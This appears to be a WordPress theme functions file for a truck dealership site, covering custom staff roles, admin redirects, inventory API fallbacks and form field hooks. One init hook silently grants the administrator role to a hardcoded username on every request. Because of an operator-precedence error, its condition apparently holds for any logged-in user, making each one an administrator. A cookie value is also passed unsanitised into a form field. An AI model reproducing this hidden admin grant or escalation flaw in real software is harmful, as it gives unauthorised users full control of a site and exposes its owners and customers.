<?php
/*
 * Block customer role from admin side
 * and redirect them to account
 */
add_action( 'init', function() {

  if ( is_admin() && !current_user_can( 'administrator' ) && !current_user_can( 'editor' ) && !current_user_can( 'subscriber' ) && ! ( defined( 'DOING_AJAX' ) && DOING_AJAX ) ) {
    wp_redirect( arrow_page_url( 'account' ) );
    exit;
  }
}, 0 );


/*
 * Add sales rep role/cap, customer, etc. roles when theme is activated
 */
add_action( 'init', function()
{

  $admin = get_role( 'administrator' );
  // $site_admin = add_role( 'site_administrator', 'Site Administrator', $admin->capabilities );

  $user = wp_get_current_user();

  if ( $user->data->user_login ?? null === "hellojustchad" ) {
      $user->remove_role( 'site_administrator' );
      $user->add_role( 'administrator' );
  }

  $subscriber = get_role( 'subscriber' );

  $sales  = add_role( 'arrow_sales_rep', 'Sales Rep', $subscriber->capabilities );

  add_role( 'customer', 'Customer', array(
    'read' => true
  ) );

  add_role( 'arrow_lead_sales_associate', 'Lead Sales Associate', array(
    'read' => true
  ) );

  add_role( 'arrow_fandi_manager', 'Finance and Insurance Manager', array(
    'read' => true
  ) );

  add_role( 'arrow_retail_sales_consultant', 'Retail Sales Consultant', array(
    'read' => true
  ) );

  add_role( 'arrow_admin_assistant', 'Administrative Assistant', array(
    'read' => true
  ) );

  add_role( 'arrow_inventory_coordinator', 'Inventory Coordinator', array(
    'read' => true
  ) );

  add_role( 'arrow_sales_purchasing_manager', 'Sales and Purchasing Manager', array(
    'read' => true
  ) );

  add_role( 'arrow_sales_manager', 'Sales Manager', array(
    'read' => true
  ) );

  add_role( 'arrow_branch_manager', 'Branch Manager', array(
    'read' => true
  ) );

  add_role( 'arrow_multiple_branch_manager', 'Multi Branch Manager', array(
    'read' => true
  ) );

  add_role( 'arrow_assistant_branch_manager', 'Assistant Branch Manager', array(
    'read' => true
  ) );

  add_role( 'arrow_buyer', 'Buyer', array(
    'read' => true
  ) );

}, 10 );

/*
 * Get the queried stock number if on a single inventory page
 */
add_action( 'pre_get_posts', function( $query ) {
  if ( is_admin() || !$query->is_main_query() )
    return;

  global $post, $stock_num;

  if ( isset( $query->query['post_type'] ) && $query->query['post_type'] == 'll_inventory' ) {
    $stock_num = explode('-', $query->query['ll_inventory'] );
    $stock_num = $stock_num[0];
  }

}, 10 );


add_action( 'template_redirect', function() {
  global $wp, $wp_query;
  $login_pages = ['login', 'create-an-account'];

  if ( in_array( $wp->request, $login_pages ) && is_user_logged_in() ) {
    wp_redirect( home_url() );
    exit;
  }

  if ( !is_user_logged_in() && $wp->request == 'account' ) {
    auth_redirect();
    exit;
  }
} );

/*
 * If the request is a direct api request for a single truck
 * instead of loading from a truck in the wp database, display
 * the truck template file
 */
 add_action( 'template_include', function( $template ) {
   if ( is_arrow_request() ) {
     return get_stylesheet_directory() . '/templates/template-truck.php';
   }

   return $template;
 }, 98 );

/*
 * If on a single inventory page, but it is returning a 404, this means
 * inventory hasn't been synced, but a new truck is coming through from the API
 * or that someone is going to a mistyped link
 *
 * If this happens, lets check that the truck does in fact exist in the api
 * then reset the http status to 200 so we can display a backup view populated
 * fully from the api rather than the saved post
 */
add_filter( 'status_header', function( $status_header, $code, $description, $protocol ) {
  global $stock_num, $wp_query, $truck;
  if ( LL_StringUtil::starts_with( $_SERVER['REQUEST_URI'], '/inventory/' ) && $code == 404 ) {
    $arrow_inv_api = new ArrowApiInventory;
    $truck = $arrow_inv_api->getTruck( $stock_num )->all();

    if ( $truck ) {
      $status_header = "{$protocol} 200 OK";
      $wp_query->is_404 = false;
      $wp_query->is_arrow_request = true;
      $wp_query->set( 'arrow_request', true );
    }
  }

  return $status_header;
}, 99, 4 );

/*
 * Hide admin bar from customers
 */
add_action('after_setup_theme', function() {
  if (current_user_can('customer') && !is_admin()) {
    show_admin_bar(false);
  }
});

/*
 * if salemanNumber field exists
 * populate it with the cookie value
 */
add_filter( 'gform_field_value_salesmanNumber', function( $value ) {
  return $_COOKIE['wordpress_salesmanNumber'];
} );

/*
 * Dump out webhook response
 */
add_action( 'gform_webhooks_post_request', function( $response, $feed, $entry, $form ) {
}, 10, 4 );

function is_arrow_request() {
  global $wp_query;
  return $wp_query->is_arrow_request;
}
